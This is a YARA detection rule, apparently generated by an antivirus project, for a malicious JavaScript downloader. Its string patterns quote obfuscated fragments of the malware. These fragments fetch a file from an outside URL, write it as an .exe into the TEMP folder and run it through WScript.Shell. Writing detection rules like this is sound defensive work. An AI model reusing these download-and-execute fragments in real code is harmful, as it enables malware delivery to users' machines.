rule sig_20160329_17830a200763969f0eba7027e341d14d {
  meta:
    description = "datamaliciousorder - file 20160329_17830a200763969f0eba7027e341d14d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8160287ba5908364159f33acc56a3258a94a557d50f9efa203a1abe41a567bf8"

  strings:
    $s1  = "function Nxhvuekdj() {return Gyasaomyd[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"ElmLJ9BHWOA.exe\";};" fullword ascii
    $s2  = "Mitxfbx[Heatyfw](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Jqhlwnvzej](Shidhl() * 11)} while (Mitxfbx[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Gyasaomyd = function Bxdmjsuu() {return WScript[Pkpmahmoak](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Uxxaicxfnn(Jrmswrxc, Vxtesnely){return Jrmswrxc - Vxtesnely;};" fullword ascii
    $s6  = "function Mgrantbhag(){return Pkpmahmoak;};" fullword ascii
    $s7  = "function Lwudan(Inktrydc){Gyasaomyd[\"Run\"](Inktrydc, Pnnkt, Pnnkt);};" fullword ascii
    $s8  = "function Fpdoffo() {return ((Ztqzl == true) && (Ztqzl == Nxfafolk)) ? 1 : Pnnkt;};" fullword ascii
    $s9  = "function Zjjdj()" fullword ascii
    $s10 = " while (Shjuwubp){" fullword ascii
    $s11 = "Ztqzl = true; " fullword ascii
    $s12 = "Nxfafolk = true; " fullword ascii
    $s13 = "function Dosqvzg(){return Jpigwxqow;};" fullword ascii
    $s14 = "return Uxxaicxfnn(Nsmktuj, Ngnhlsy);" fullword ascii
    $s15 = "var Hivje = new this[\"Date\"]();" fullword ascii
    $s16 = "var Ztqzl = false;" fullword ascii
    $s17 = "function Shidhl(){return 22;};" fullword ascii
    $s18 = "var Nxfafolk = false;" fullword ascii
    $s19 = "var Ilbov = false;" fullword ascii
    $s20 = "function Hgfuzent(Inakctrh) {var Lpdxw = (1, 2, 3, 4, 5, Inakctrh); return Lpdxw;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}